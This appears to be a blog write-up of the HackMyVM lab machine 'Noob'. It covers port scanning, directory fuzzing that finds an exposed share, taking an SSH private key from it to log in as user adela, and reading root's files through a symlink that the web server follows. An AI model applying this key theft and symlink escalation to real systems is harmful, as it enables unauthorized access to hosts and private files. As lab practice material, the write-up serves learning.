---
layout: post
author: maxin
title:  "Noob"
date:   2021-12-31 09:37:05 AM -03
category: HackMyVM
tags: Writeup
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Noob)

# Enumeration

{% highlight bash %}
# Nmap 7.92 scan initiated Mon Dec 27 14:56:11 2021 as: nmap -p- -v -oN nmapAllPorts 192.168.0.243
Nmap scan report for 192.168.0.243
Host is up (0.0042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
65530/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Dec 27 14:56:18 2021 -- 1 IP address (1 host up) scanned in 7.61 seconds
{% endhighlight %}

## Port 65530

{% highlight bash %}
PORT      STATE SERVICE VERSION
65530/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
{% endhighlight %}

# WEB

We receive page not found on default path

## Fuzzing

{% highlight bash %}
/nt4share             (Status: 301) [Size: 45] [--> /nt4share/]
{% endhighlight %}

![Untitled](/images/noob/n4tshare.png)

- Go to the .ssh
- Get id_rsa
- authorized_keys reveal the user `adela`

{% highlight bash %}
ssh adela@$IP -i id_rsa
{% endhighlight %}

# Root

The goland on port 65530 is running has an admin

Adela home’s directory its mirroing on `n4tshare` path

- Make a symbolic link on adela home directory to root directory
- `ln -s /root/ /home/adela/`
- Return to the webserver and go to the `n4tshare`

![Untitled](/images/noob/root-part1.png)|![Untitled](/images/noob/root-part2.png)